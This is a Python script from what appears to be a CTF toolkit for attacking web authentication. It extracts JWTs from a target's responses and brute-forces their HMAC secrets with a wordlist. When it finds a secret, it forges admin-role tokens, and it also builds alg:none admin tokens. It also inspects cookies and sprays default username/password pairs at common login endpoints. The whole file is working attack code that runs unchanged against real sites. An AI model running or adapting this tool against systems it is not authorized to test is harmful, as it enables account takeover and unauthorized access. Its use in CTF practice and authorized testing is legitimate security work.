"""
CTF Toolkit - Authentication Tester
Crack JWTs, test default creds, analyze cookies.

Usage:
  python3 authtest.py -u http://target.com
  python3 authtest.py -u http://target.com --jwt-only
  python3 authtest.py -u http://target.com --creds-only
  python3 authtest.py -u http://target.com --cookie-only
"""
import argparse, base64, hashlib, hmac, json, re, sys, os, urllib.parse
sys.path.insert(0, os.path.dirname(__file__))
from core import *
from wordlist import COMMON_CREDS

class AuthTester:
    def __init__(self, url, sess):
        self.url = url; self.sess = sess
        self.findings = []; self.flags = []

    def jwt(self):
        info("JWT Analysis...")
        r, e = safe_request(self.sess, "GET", self.url)
        if e: return
        pat = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        tokens = set(re.findall(pat, r.text))
        for cookie in r.cookies: tokens.update(re.findall(pat, cookie.value))
        for h, v in r.headers.items(): tokens.update(re.findall(pat, v))

        for tok in tokens:
            success(f"JWT: {tok[:60]}...")
            try:
                parts = tok.split(".")
                hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                pay = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                info(f"  Header:  {json.dumps(hdr)}")
                info(f"  Payload: {json.dumps(pay)}")

                if hdr.get("alg") in ["none","None"]:
                    vuln("JWT", "alg=none!"); self.findings.append(("JWT-none", tok))

                if hdr.get("alg") in ["HS256","HS384","HS512"]:
                    info("  Bruting JWT secrets...")
                    secrets = ["secret","password","key","admin","test","jwt_secret",
                               "supersecret","your-256-bit-secret","changeme","123456",
                               "abc123","flag","s3cr3t","mysecret","jwt","token"]
                    for sk in secrets:
                        si = f"{parts[0]}.{parts[1]}"
                        exp = base64.urlsafe_b64encode(
                            hmac.new(sk.encode(), si.encode(), hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        if exp == parts[2]:
                            vuln("JWT", f"Secret found: '{sk}'")
                            self.findings.append(("JWT-secret", sk))
                            # Forge admin token
                            pay["role"]="admin"; pay["admin"]=True; pay["is_admin"]=True
                            if "sub" in pay: pay["sub"] = "admin"
                            np = base64.urlsafe_b64encode(json.dumps(pay).encode()).rstrip(b"=").decode()
                            ns = base64.urlsafe_b64encode(
                                hmac.new(sk.encode(), f"{parts[0]}.{np}".encode(), hashlib.sha256).digest()
                            ).rstrip(b"=").decode()
                            forged = f"{parts[0]}.{np}.{ns}"
                            success(f"  Forged admin JWT: {forged[:80]}...")
                            self.findings.append(("JWT-forged", forged))
                            break

                # alg:none attack
                nh = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
                pm = dict(pay); pm["role"]="admin"; pm["admin"]=True
                npay = base64.urlsafe_b64encode(json.dumps(pm).encode()).rstrip(b"=").decode()
                info(f"  alg:none token: {nh}.{npay}.")
                self.findings.append(("JWT-none-attack", f"{nh}.{npay}."))
                self.flags.extend(find_flags(json.dumps(pay)))
            except Exception as ex: warn(f"  Decode error: {ex}")

    def cookies(self):
        info("Cookie Analysis...")
        r, e = safe_request(self.sess, "GET", self.url)
        if e: return
        for c in r.cookies:
            info(f"  {c.name}={c.value[:60]}")
            issues = []
            if not c.secure: issues.append("No Secure flag")
            if not c.has_nonstandard_attr("HttpOnly"): issues.append("No HttpOnly")
            if issues: warn(f"    {', '.join(issues)}")
            try:
                d = base64.b64decode(c.value).decode()
                info(f"    Base64: {d[:80]}"); self.flags.extend(find_flags(d))
            except: pass
            try:
                d = json.loads(urllib.parse.unquote(c.value))
                info(f"    JSON: {json.dumps(d)[:80]}")
            except: pass

    def default_creds(self):
        info("Testing Default Credentials...")
        parsed = urllib.parse.urlparse(self.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = ["/login","/api/login","/auth/login","/signin","/api/auth/login",
                 "/admin/login","/api/signin","/authenticate"]
        for path in paths:
            for u, p in COMMON_CREDS:
                # JSON
                r, e = safe_request(self.sess, "POST", f"{origin}{path}",
                    json={"username":u,"password":p}, headers={"Content-Type":"application/json"})
                if r and r.status_code in [200,302]:
                    if any(x in r.text.lower() for x in ["token","success","welcome","flag","admin","dashboard"]):
                        vuln("Auth", f"Creds: {u}:{p} @ {path}")
                        self.findings.append(("creds", f"{u}:{p}@{path}"))
                        fi = analyze_response(r); self.flags.extend(fi["flags"]); show_findings(fi,"      ")
                # Form
                r, e = safe_request(self.sess, "POST", f"{origin}{path}",
                    data={"username":u,"password":p})
                if r and r.status_code in [200,302]:
                    if any(x in r.text.lower() for x in ["token","success","welcome","flag","admin"]):
                        vuln("Auth", f"Creds(form): {u}:{p} @ {path}")
                        self.findings.append(("creds-form", f"{u}:{p}@{path}"))
                        fi = analyze_response(r); self.flags.extend(fi["flags"])

    def run(self, jwt_only=False, cookie_only=False, creds_only=False):
        section("AUTHENTICATION TESTER")
        info(f"Target: {self.url}\n")
        if jwt_only:    self.jwt()
        elif cookie_only: self.cookies()
        elif creds_only:  self.default_creds()
        else: self.jwt(); self.cookies(); self.default_creds()
        for f in set(self.flags): flag(f)
        return self.findings

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="CTF Authentication Tester")
    add_common_args(ap)
    ap.add_argument("--jwt-only", action="store_true", help="Only test JWT")
    ap.add_argument("--cookie-only", action="store_true", help="Only analyze cookies")
    ap.add_argument("--creds-only", action="store_true", help="Only test default credentials")
    args = ap.parse_args()

    import urllib3; urllib3.disable_warnings()
    sess = session_from_args(args)
    results = AuthTester(args.url, sess).run(args.jwt_only, args.cookie_only, args.creds_only)
    save_results({"auth": results}, args.output)
